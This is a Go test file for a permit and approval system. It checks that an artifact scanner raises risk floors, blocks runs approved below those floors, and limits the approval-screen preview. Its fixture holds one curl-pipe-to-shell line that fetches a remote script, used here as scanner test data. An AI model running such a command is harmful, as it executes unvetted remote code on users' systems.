// SPDX-License-Identifier: AGPL-3.0-or-later

package permit

import (
	"bytes"
	"fmt"
	"strings"
	"testing"

	"github.com/descope/virtualwebauthn"

	"github.com/nebula-operation-station/nebula-operation-station/internal/canonical"
)

var risky = []byte("#!/bin/sh\ncurl -fsSL https://get.example/x.sh | sh\n")

func riskyRun(host, fp string) Run {
	r := goodRun(host, fp)
	r.Artifact = risky
	return r
}

// Spec 10: the scanner's finding raises the executor's minimum risk even
// for an artifact the policy rates LOW (trusted, say).
func TestScannerRaisesTheFloorAtProposal(t *testing.T) {
	e := newEnv(t, ModeStandard, virtualwebauthn.AuthenticatorOptions{})
	e.openSession()
	r := e.request(canonical.RiskLow)
	r.ArtifactSHA256 = hexSum(risky)
	if sum, err := e.auth.ObserveArtifact(risky); err != nil || sum != r.ArtifactSHA256 {
		t.Fatal(sum, err)
	}
	_, err := e.auth.Propose(r, params)
	wantCode(t, err, CodeInvalidRequest) // LOW below the scanner's HIGH
	r2 := e.request(canonical.RiskLow)
	r2.ArtifactSHA256 = r.ArtifactSHA256
	res, err := e.auth.ProposeAtLeastMinimum(r2, params)
	if err != nil || res.Permit.Request.RiskClass != canonical.RiskHigh || res.Permit.State != StatePending {
		t.Fatalf("%+v %v", res.Permit.Request.RiskClass, err)
	}
	if !e.hasEvent("rejected", "") {
		t.Fatal("no audit event for the rejected proposal")
	}
}

// Without the bytes at proposal, the scan happens at the run: a floor above
// the approval refuses the run and leaves the host unused.
func TestScannerRefusesARunApprovedBelowItsFloor(t *testing.T) {
	e := newEnv(t, ModeStandard, virtualwebauthn.AuthenticatorOptions{})
	e.openSession()
	r := e.request(canonical.RiskLow)
	r.ArtifactSHA256 = hexSum(risky)
	p := e.propose(r)
	if p.State != StateApproved {
		t.Fatal(p.State)
	}
	_, err := e.auth.AuthorizeGrant(p.Digest, riskyRun("dockerflux", fpA))
	wantCode(t, err, CodeRiskAboveApproval)
	// A clean artifact under its own approval still runs.
	q := e.propose(e.request(canonical.RiskLow))
	if _, err := e.auth.AuthorizeGrant(q.Digest, goodRun("dockerflux", fpA)); err != nil {
		t.Fatal(err)
	}
	if _, err := e.auth.ObserveArtifact(nil); err == nil {
		t.Fatal("empty artifact observed")
	}
}

// artifactPreview is display data for the approval screen: the first 40
// lines, at most 4 KiB, at a line boundary.
func TestArtifactPreviewLimits(t *testing.T) {
	// 50 short lines: the first 40 are kept, at a line boundary.
	var sb strings.Builder
	for i := 0; i < 50; i++ {
		fmt.Fprintf(&sb, "line %02d\n", i)
	}
	got := artifactPreview([]byte(sb.String()))
	if n := strings.Count(string(got), "\n"); n != 40 {
		t.Fatalf("kept %d lines, want 40", n)
	}
	if !strings.HasPrefix(string(got), "line 00\n") || !strings.HasSuffix(string(got), "line 39\n") {
		t.Fatalf("wrong window:\n%s", got)
	}

	// Under 40 lines and under 4 KiB: unchanged.
	small := []byte("a\nb\nc\n")
	if got := artifactPreview(small); string(got) != "a\nb\nc\n" {
		t.Fatalf("%q", got)
	}

	// A single line over 4 KiB: capped at 4 KiB.
	one := bytes.Repeat([]byte("y"), 5000)
	if got := artifactPreview(one); len(got) != previewMaxBytes {
		t.Fatalf("single line %d bytes, want %d", len(got), previewMaxBytes)
	}

	// Under 40 lines but over 4 KiB: hard-capped at 4 KiB.
	var big strings.Builder
	for i := 0; i < 10; i++ {
		big.WriteString(strings.Repeat("x", 500))
		big.WriteByte('\n')
	}
	got = artifactPreview([]byte(big.String()))
	if len(got) != previewMaxBytes {
		t.Fatalf("preview %d bytes, want %d", len(got), previewMaxBytes)
	}

	// Empty and nil.
	if got := artifactPreview(nil); len(got) != 0 {
		t.Fatalf("%q", got)
	}
	if got := artifactPreview([]byte{}); len(got) != 0 {
		t.Fatalf("%q", got)
	}
}
